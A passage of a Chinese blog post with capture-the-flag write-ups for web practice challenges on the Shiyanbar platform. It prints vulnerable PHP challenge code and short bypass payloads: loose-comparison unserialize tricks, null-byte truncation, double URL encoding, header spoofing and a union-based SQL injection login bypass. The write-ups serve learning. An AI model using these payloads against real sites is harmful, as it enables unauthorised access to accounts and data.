<h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p>F12看到登录判断代码，是需要用户名md5值为0，任意选一个md5以<code>0e</code>开头的字符串就会被当作是0处理。登录后得到一个url，访问得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$data_unserialize = unserialize($unserialize_str);</span><br><span class="line"><span class="keyword">if</span>($data_unserialize[<span class="string">&#x27;user&#x27;</span>] == <span class="string">&#x27;???&#x27;</span> &amp;&amp; $data_unserialize[<span class="string">&#x27;pass&#x27;</span>]==<span class="string">&#x27;???&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  print_r($flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到关于<code>password</code>的提示，这里利用弱等于漏洞，直接让<code>user</code>和<code>pass</code>都为<code>true</code>即可。payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;b:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p>随便填个邮箱地址，在源代码中发现这样两行：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">content</span>=<span class="string">&quot;admin@simplexue.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;editor&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Vim&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二行的<code>vim</code>一般指Vim编辑器，容易联想到它产生的备份文件<code>.swp</code>，可能在网站目录下存在这类文件。而第一行的邮箱显然就是我们需要的管理员邮箱了。</p>
<p>此外还能得到提示：下一步跳转到<code>step2.php</code>，接收一个<code>email</code>参数和一个<code>check</code>参数。如果随意填写<code>check</code>参数则会显示<code>check error</code>然后返回<code>step1.php</code>。</p>
<p>抓包访问<code>step2.php</code>，查看源码，注意到它会提交请求到<code>submit.php</code>，而如果直接访问则会得到<code>you are not an admin</code>。因此考虑获取三个页面中某一个的源码，尝试<code>.step1.php.swp</code>和<code>.step2.php.swp</code>无果，但是存在<code>.submit.php.swp</code>。核心代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	$sql = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;失败了呀&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要求<code>token</code>长度为10且值等于0，可以直接令其等于<code>0000000000</code>（<code>0e</code>绕过应该也行）。最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;10&#x2F;upload&#x2F;submit.php?emailAddress&#x3D;admin@simplexue.com&amp;token&#x3D;0000000000</span><br></pre></td></tr></table></figure>

<h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p>首先拿到源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, $_GET[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码先检查传入的密码是否是由字母和数字构成，然后限制了长度小于8但值大于9999999，最后密码中需要含有<code>*-*</code>。</p>
<p>题目提示<code>ereg</code>函数存在漏洞，猜测这里是利用<code>%00</code>截断，构造<code>password=1e9%00*-*</code>即可绕过。需要注意的是，如果直接在输入框输入，<code>%00</code>会被二次URL编码。</p>
<h2 id="GuessNextSession"><a href="#GuessNextSession" class="headerlink" title="GuessNextSession"></a>GuessNextSession</h2><p>这题属于错误出题的典范，直接点Guess就可以出答案。。。为什么呢？还是先看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;password&#x27;</span>] == $_SESSION[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里要求参数<code>password</code>和<code>session</code>中的<code>password</code>相同，而且是弱等号，所以当我们清空cookie，什么都不填直接提交时，弱等号比较必定返回<code>true</code>。</p>
<h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p>数组绕过SHA1碰撞。</p>
<h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p>根据加密函数写解密函数，这里感觉用PHP比用Python要简单一点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">	$_o = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">	$_ = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> ($_0 = <span class="number">0</span>; $_0 &lt; strlen($_o); ++$_0) &#123;</span><br><span class="line">		$_c = substr($_o, $_0, <span class="number">1</span>);</span><br><span class="line">		$__ = ord($_c) - <span class="number">1</span>;</span><br><span class="line">		$_c = chr($__);</span><br><span class="line">		$_ .= $_c;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> strrev($_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decode(<span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的技巧是<code>rot13</code>加密两次后会恢复出原来的明文，所以其解密和加密用的是同一个函数。</p>
<h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p>F12发现<code>index.txt</code>，核心代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(<span class="string">&quot;********&quot;</span>, <span class="string">&quot;*****&quot;</span>, <span class="string">&quot;********&quot;</span>);</span><br><span class="line">	mysql_select_db(<span class="string">&quot;phpformysql&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Could not select database&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select pw from php where user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">	printf(<span class="string">&quot;Error: %s\n&quot;</span>, mysql_error($conn));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row[&quot;pw&quot;];</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里会将<code>pass</code>参数MD5后赋值给<code>pass</code>变量，但username没有过滤，存在注入。构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;-1&#39; union select md5(1)#&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
<p>使得<code>pass</code>的值经过MD5后与查询结果相同，即可登录。</p>
<h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p>jsfuck直接控制台运行。</p>
<h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p>根据提示拿到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">&quot;hackerDJ&quot;</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">&quot;hackerDJ&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>二次URL编码绕过。</p>
<h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p>XFF头伪造IP为<code>1.1.1.1</code>。</p>
<h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p>修改请求头中的<code>User-agent</code>和<code>Accept-Language</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; .NET CLR 9.9)</span><br><span class="line">Accept-Language: en-gb,en;q&#x3D;0.9</span><br></pre></td></tr></table></figure>

<h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p>抓包发现异常字段<code>Content-Row</code>，长得像base64但并不需要解码，直接填在<code>pass_key</code>里提交就好。</p>
<h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p>这题如果不用admin登录，会显示数据库连接失败，看起来就像题被打了一样。</p>
<p>所以跑sqlmap用的url中，用户名必须是<code>admin</code>，比如<code>http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin&amp;pass=admin&amp;action=login</code>。其它没有什么坑点。</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>实验吧 Web 练习</p><p><a href="https://signormercurio.me/post/ShiYanBaWeb/">https://signormercurio.me/post/ShiYanBaWeb/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-07-26</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/SQLi/">SQLi</a><a class="link-muted mr-2" rel="tag" href="/tags/Hash/">Hash</a><a class="link-muted mr-2" rel="tag" href="/tags/%E7%BC%96%E7%A0%81/">编码</a><a class="link-muted mr-2" rel="tag" href="/tags/php/">php</a><a class="link-muted mr-2" rel="tag" href="/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">CBC字节翻转攻击</a><a class="link-muted mr-2" rel="tag" href="/tags/%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81/">二次编码</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/IcqWeb/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">i 春秋 Web 入门练习 Part I.</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/SummerSchool/"><span class="level-item">ECNU X 启明星辰 网络安全暑期学校记录</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#简单的登录题"><span class="level-left"><span class="level-item">1</span><span class="level-item">简单的登录题</span></span></a></li><li><a class="level is-mobile" href="#后台登录"><span class="level-left"><span class="level-item">2</span><span class="level-item">后台登录</span></span></a></li><li><a class="level is-mobile" href="#加了料的报错注入"><span class="level-left"><span class="level-item">3</span><span class="level-item">加了料的报错注入</span></span></a></li><li><a class="level is-mobile" href="#认真一点！"><span class="level-left"><span class="level-item">4</span><span class="level-item">认真一点！</span></span></a></li><li><a class="level is-mobile" href="#你真的会PHP吗？"><span class="level-left"><span class="level-item">5</span><span class="level-item">你真的会PHP吗？</span></span></a></li><li><a class="level is-mobile" href="#登陆一下好吗？？"><span class="level-left"><span class="level-item">6</span><span class="level-item">登陆一下好吗？？</span></span></a></li><li><a class="level is-mobile" href="#因缺斯汀的绕过"><span class="level-left"><span class="level-item">7</span><span class="level-item">因缺斯汀的绕过</span></span></a></li><li><a class="level is-mobile" href="#简单的sql注入之3-2-1"><span class="level-left"><span class="level-item">8</span><span class="level-item">简单的sql注入之3/2/1</span></span></a></li><li><a class="level is-mobile" href="#天下武功唯快不破"><span class="level-left"><span class="level-item">9</span><span class="level-item">天下武功唯快不破</span></span></a></li><li><a class="level is-mobile" href="#让我进去"><span class="level-left"><span class="level-item">10</span><span class="level-item">让我进去</span></span></a></li><li><a class="level is-mobile" href="#拐弯抹角"><span class="level-left"><span class="level-item">11</span><span class="level-item">拐弯抹角</span></span></a></li><li><a class="level is-mobile" href="#Forms"><span class="level-left"><span class="level-item">12</span><span class="level-item">Forms</span></span></a></li><li><a class="level is-mobile" href="#天网管理系统"><span class="level-left"><span class="level-item">13</span><span class="level-item">天网管理系统</span></span></a></li><li><a class="level is-mobile" href="#忘记密码了"><span class="level-left"><span class="level-item">14</span><span class="level-item">忘记密码了</span></span></a></li><li><a class="level is-mobile" href="#Once-More"><span class="level-left"><span class="level-item">15</span><span class="level-item">Once More</span></span></a></li><li><a class="level is-mobile" href="#GuessNextSession"><span class="level-left"><span class="level-item">16</span><span class="level-item">GuessNextSession</span></span></a></li><li><a class="level is-mobile" href="#FALSE"><span class="level-left"><span class="level-item">17</span><span class="level-item">FALSE</span></span></a></li><li><a class="level is-mobile" href="#NSCTF-web200"><span class="level-left"><span class="level-item">18</span><span class="level-item">NSCTF web200</span></span></a></li><li><a class="level is-mobile" href="#程序逻辑问题"><span class="level-left"><span class="level-item">19</span><span class="level-item">程序逻辑问题</span></span></a></li><li><a class="level is-mobile" href="#what-a-fuck-这是什么鬼东西"><span class="level-left"><span class="level-item">20</span><span class="level-item">what a fuck!这是什么鬼东西?</span></span></a></li><li><a class="level is-mobile" href="#PHP大法"><span class="level-left"><span class="level-item">21</span><span class="level-item">PHP大法</span></span></a></li><li><a class="level is-mobile" href="#貌似有点难"><span class="level-left"><span class="level-item">22</span><span class="level-item">貌似有点难</span></span></a></li><li><a class="level is-mobile" href="#头有点大"><span class="level-left"><span class="level-item">23</span><span class="level-item">头有点大</span></span></a></li><li><a class="level is-mobile" href="#猫抓老鼠"><span class="level-left"><span class="level-item">24</span><span class="level-item">猫抓老鼠</span></span></a></li><li><a class="level is-mobile" href="#看起来有点难"><span class="level-left"><span class="level-item">25</span><span class="level-item">看起来有点难</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-25T17:44:35.000Z">2021-09-25</time></p><p class="title"><a href="/post/Dockerfile2GKE/">从 Dockerfile 到 GKE：再探 GitHub Actions</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-23T09:03:42.000Z">2021-09-23</time></p><p class="title"><a href="/post/GCP/">Google Cloud Platform 基础</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/Container/">云原生技术原理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-08T07:50:13.000Z">2021-09-08</time></p><p class="title"><a href="/post/GoError/">Go Error 处理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-26T14:57:42.000Z">2021-08-26</time></p><p class="title"><a href="/post/M1Win11/">在 MacBook Pro M1 上运行 Windows 11</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>